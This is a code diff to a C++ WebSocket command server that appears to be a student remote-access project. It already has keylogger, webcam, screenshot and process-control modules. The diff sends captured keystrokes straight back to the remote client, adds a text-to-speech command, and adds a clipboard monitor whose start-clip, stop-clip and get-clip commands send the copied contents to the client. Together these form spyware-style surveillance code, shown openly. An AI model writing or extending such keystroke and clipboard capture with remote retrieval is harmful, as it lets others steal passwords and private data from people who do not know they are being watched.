@@ -25,7 +25,8 @@
 #include "Webcam.h"
 #include "Application.h"
 #include "ScreenShot.h"
-
+#include "TextToSpeech.h"
+#include "Clipboard.h"
 // Link thu vien Windows
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "advapi32.lib")
@@ -254,7 +255,7 @@ public:
             static Keylogger myKeylogger;
             static Process myProcessModule;
             static Application myAppModule;
-
+            static Clipboard myClipboard;
             // ---------------------------------------------------------
             // [SECTION 1] SYSTEM INFO, PING, POWER
             // ---------------------------------------------------------
@@ -330,8 +331,10 @@ public:
             else if (command == "stop-keylog") { myKeylogger.StopKeyLogging(); ws_.text(true); ws_.write(net::buffer("Server: Keylogger stopped.")); }
             else if (command == "get-keylog") {
                 std::string logs = myKeylogger.GetLoggedKeys();
-                if (logs.empty()) logs = "[No keys recorded]";
-                ws_.text(true); ws_.write(net::buffer("KEYLOG_DATA:\n" + logs));
+                // Không cần check empty vì hàm GetLoggedKeys luôn trả về header MODE:...
+
+                // Gửi trực tiếp logs (đã có sẵn header MODE:...) để Client tự tách
+                ws_.text(true); ws_.write(net::buffer(logs));
             }
 
             // ---------------------------------------------------------
@@ -385,6 +388,38 @@ public:
                 bool ok = myAppModule.StopApplication(input);
                 ws_.text(true); ws_.write(net::buffer(ok ? "Server: Stopped " + input : "Server: Failed stop " + input));
             }
+            // [SECTION 6] TEXT TO SPEECH (VUI NHON)
+            // ---------------------------------------------------------
+            else if (command.rfind("tts ", 0) == 0) {
+                // Cu phap: tts Hello Teacher
+                std::string textToSpeak = command.substr(4); // Cat bo chu "tts "
+
+                static TextToSpeech myTTS; // Khoi tao static de dung chung
+                myTTS.Speak(textToSpeak);
+
+                ws_.text(true);
+                ws_.write(net::buffer("Server: OK, speaking: \"" + textToSpeak + "\""));
+                }
+                // [SECTION 7] CLIPBOARD MONITOR (THEO DÕI COPY/PASTE)
+                // ---------------------------------------------------------
+            else if (command == "start-clip") {
+                myClipboard.StartMonitoring();
+                ws_.text(true);
+                ws_.write(net::buffer("Server: Clipboard Monitor STARTED (Background)..."));
+            }
+            else if (command == "stop-clip") {
+                myClipboard.StopMonitoring();
+                ws_.text(true);
+                ws_.write(net::buffer("Server: Clipboard Monitor STOPPED."));
+                }
+            else if (command == "get-clip") {
+                    std::string logs = myClipboard.GetLogs();
+                    if (logs.empty()) logs = "[No clipboard data recorded]";
+
+                    // Gửi dữ liệu về Client
+                    ws_.text(true);
+                    ws_.write(net::buffer("CLIPBOARD_DATA:\n" + logs));
+                    }
         }
         buffer_.consume(buffer_.size());
         do_read();
